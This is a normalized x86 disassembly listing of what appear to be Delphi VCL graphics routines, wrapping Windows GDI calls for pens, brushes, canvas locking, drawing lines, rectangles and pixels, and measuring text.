mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_40ef78
mov esp ebp
pop ebp
retn
sub_40f014
push ebp
mov ebp esp
add esp 0xffffffe4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_40dc6c
xor eax eax
push ebp
push sub_40f0a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_40dc84
retn
mov eax [ ebp - 0xc ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
call sub_40e410
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0xc ]
mov [ edx + 0x8 ] eax
sub_40f0b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x18 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] al
mov eax [ ebp - 0x4 ]
mov bx 0xfffd
call sub_44c24c
sub_40f0ec
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_40f108
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_40ef48
mov al [ ebp - 0x5 ]
mov [ ebp - 0xc ] al
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_40ef78
mov esp ebp
pop ebp
retn
sub_40f134
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_40f150
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_40ef48
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_40ef78
sub_40f184
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_40dc9c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40f1d0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax [ rw-data ]
call sub_40dda0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_40f204
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43cd0c
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40e4b4
xor eax eax
push ebp
push sub_40f294
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_40e4b4
xor eax eax
push ebp
push sub_40f277
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40def0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f27e
mov eax [ ebp - 0x8 ]
call sub_40e4d4
retn
sub_40f2ac
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x8 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x8 ] edx
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_40f2e4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40e4b4
xor eax eax
push ebp
push sub_40f32c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40de6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f333
mov eax [ ebp - 0x4 ]
call sub_40e4d4
retn
sub_40f338
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi rw-data
lea edi [ ebp - 0x18 ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_40f2e4
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_40f36c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_40f388
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_40f2ac
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0xc ] 0x1
jne r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_40f2e4
mov esp ebp
pop ebp
retn
mov [ ebp - 0xc ] 0x0
sub_40f3c0
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_40dc6c
xor eax eax
push ebp
push sub_40f49d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_40dc84
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov al [ eax + 0x1c ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x18 ] 0x3
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x18 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x60 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
call sub_40e410
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0xc ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x18 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] 0x2
mov eax [ ebp - 0xc ]
movzx eax [ eax + 0x1c ]
sub eax 0x2
mov [ ebp - 0x10 ] eax
sub_40f4b4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_40f4d0
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_40f2ac
mov al [ ebp - 0x5 ]
mov [ ebp - 0xc ] al
cmp [ ebp - 0xc ] 0x1
jne r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_40f2e4
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xffffff
sub_40f50c
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c040
mov eax [ ebp - 0x4 ]
add eax 0x38
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_40e7d8
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_40ff6c
mov eax [ ebp - 0x4 ]
add eax 0x38
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov [ edx + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ee08
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_40ffa0
mov eax [ ebp - 0x4 ]
add eax 0x38
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
mov [ edx + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40f184
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_40ffd4
mov eax [ ebp - 0x4 ]
add eax 0x38
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0xcc0020
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x8 ] dl
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_43c958
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40f61c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_43ca0c
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40fcf0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
add eax 0x38
push eax
call DeleteCriticalSection
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_43ccd0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_40f694
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_40fd6c
mov dl [ r-xdata ]
mov eax [ ebp - 0xc ]
call sub_40fd6c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
sub eax [ edx + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov esp ebp
pop ebp
retn 0x4
sub_40f744
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_40fd6c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_40f36c
call sub_40e410
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBkColor
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_40e410
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_43b7c8
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_40f808
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_40fd6c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_40f3c0
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
pop ecx
pop ecx
pop ebp
retn
sub_40f858
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_40fd6c
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call LineTo
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov esp ebp
pop ebp
retn
sub_40f8a4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
mov eax [ ebp - 0x4 ]
inc [ eax + 0x50 ]
push rw-data
call LeaveCriticalSection
mov eax [ ebp - 0x4 ]
add eax 0x38
push eax
call EnterCriticalSection
pop ecx
pop ebp
retn
sub_40f8d4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_40fd6c
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call MoveToEx
mov esp ebp
pop ebp
retn
sub_40f910
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_40fd6c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call Rectangle
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov esp ebp
pop ebp
retn 0x8
sub_40f964
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_40fd6c
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_40f9b0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_40fd6c
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_44cd60
push eax
mov eax [ ebp - 0x8 ]
call sub_44cf24
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetTextExtentPoint32A
mov esp ebp
pop ebp
retn
sub_40fa08
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40f9b0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_40fa30
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40f9b0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_40fa58
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_40faaa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fab1
push rw-data
call LeaveCriticalSection
retn
mov eax [ ebp - 0x4 ]
call sub_40f8a4
sub_40fab8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
mov eax [ ebp - 0x4 ]
dec [ eax + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ecx
pop ebp
retn
sub_40fae8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_40fb08
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_40fb28
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_40fb48
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_40fd6c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetCurrentPositionEx
pop ecx
pop ecx
pop ebp
retn
sub_40fb7c
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40f8d4
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_40fba4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_40fd6c
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetPixel
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_40fbe4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_40fd6c
mov eax [ ebp + 0x8 ]
call sub_40e410
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetPixel
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov esp ebp
pop ebp
retn 0x4
sub_40fc38
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_40fd6c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_40fc6c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov al [ r-xdata ]
mov edx [ ebp - 0x4 ]
not eax
and al [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
mov edx [ ebp - 0x4 ]
not eax
and al [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] al
sub_40fcf0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fc6c
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_40fb48
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x4 ]
and [ eax + 0x8 ] 0xfe
mov eax [ ebp - 0x4 ]
or [ eax + 0x8 ] 0x1
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_40fb7c
sub_40fd6c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x8 ]
not eax
and al [ ebp - 0x5 ]
mov [ ebp - 0x6 ] al
mov al [ r-xdata ]
cmp al [ ebp - 0x6 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
test [ ebp - 0x6 ] 0x1
je r-xdata
test [ ebp - 0x6 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
test [ ebp - 0x6 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fe48
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
call sub_44c7a8
test [ ebp - 0x6 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
